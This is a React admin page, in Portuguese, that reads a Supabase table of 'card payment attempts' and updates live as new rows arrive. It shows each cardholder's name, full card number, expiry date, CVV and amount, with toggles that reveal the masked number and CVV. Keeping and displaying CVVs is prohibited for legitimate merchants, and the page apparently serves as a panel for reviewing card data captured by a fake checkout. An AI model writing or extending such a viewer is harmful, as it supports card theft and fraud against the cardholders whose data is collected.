import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { ArrowLeft, CreditCard, Eye, EyeOff } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";

export default function AdminCardData() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [loading, setLoading] = useState(true);
  const [cardAttempts, setCardAttempts] = useState<any[]>([]);
  const [showCardNumbers, setShowCardNumbers] = useState<{ [key: string]: boolean }>({});
  const [showCVVs, setShowCVVs] = useState<{ [key: string]: boolean }>({});

  useEffect(() => {
    loadCardAttempts();

    // Configurar realtime para atualizar automaticamente quando novos dados chegarem
    const channel = supabase
      .channel('card_attempts_changes')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'card_payment_attempts'
        },
        () => {
          loadCardAttempts();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const loadCardAttempts = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from("card_payment_attempts")
        .select("*")
        .order("created_at", { ascending: false });

      if (error) {
        console.error("Erro ao carregar tentativas de cartão:", error);
        throw error;
      }
      
      console.log("Tentativas de cartão carregadas:", data?.length || 0);
      setCardAttempts(data || []);
    } catch (error: any) {
      console.error("Erro completo:", error);
      toast({
        title: "Erro ao carregar dados",
        description: error.message,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const formatCardNumber = (number: string, show: boolean) => {
    if (show) {
      return number.replace(/(\d{4})/g, "$1 ").trim();
    }
    return "**** **** **** " + number.slice(-4);
  };

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(value);
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const toggleCardNumber = (id: string) => {
    setShowCardNumbers(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const toggleCVV = (id: string) => {
    setShowCVVs(prev => ({ ...prev, [id]: !prev[id] }));
  };

  return (
    <div className="min-h-screen bg-background p-4 lg:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="sm" onClick={() => navigate("/admin")}>
            <ArrowLeft className="w-4 h-4 mr-2" />
            Voltar
          </Button>
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <CreditCard className="w-6 h-6" />
            Dados de Cartão
          </h1>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Tentativas de Pagamento com Cartão</CardTitle>
          </CardHeader>
          <CardContent>
            {loading ? (
              <div className="text-center py-8">
                <p className="text-muted-foreground">Carregando...</p>
              </div>
            ) : cardAttempts.length === 0 ? (
              <div className="text-center py-8">
                <p className="text-muted-foreground">Nenhuma tentativa de pagamento registrada</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Data/Hora</TableHead>
                      <TableHead>Nome do Titular</TableHead>
                      <TableHead>Número do Cartão</TableHead>
                      <TableHead>Validade</TableHead>
                      <TableHead>CVV</TableHead>
                      <TableHead>Valor</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {cardAttempts.map((attempt) => (
                      <TableRow key={attempt.id}>
                        <TableCell className="text-sm">
                          {formatDate(attempt.created_at)}
                        </TableCell>
                        <TableCell className="font-medium">
                          {attempt.nome_titular}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span className="font-mono">
                              {formatCardNumber(attempt.numero_cartao, showCardNumbers[attempt.id])}
                            </span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => toggleCardNumber(attempt.id)}
                            >
                              {showCardNumbers[attempt.id] ? (
                                <EyeOff className="w-4 h-4" />
                              ) : (
                                <Eye className="w-4 h-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell className="font-mono">
                          {attempt.data_validade}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span className="font-mono">
                              {showCVVs[attempt.id] ? attempt.cvv : "***"}
                            </span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => toggleCVV(attempt.id)}
                            >
                              {showCVVs[attempt.id] ? (
                                <EyeOff className="w-4 h-4" />
                              ) : (
                                <Eye className="w-4 h-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell className="font-semibold text-primary">
                          {formatCurrency(Number(attempt.valor))}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
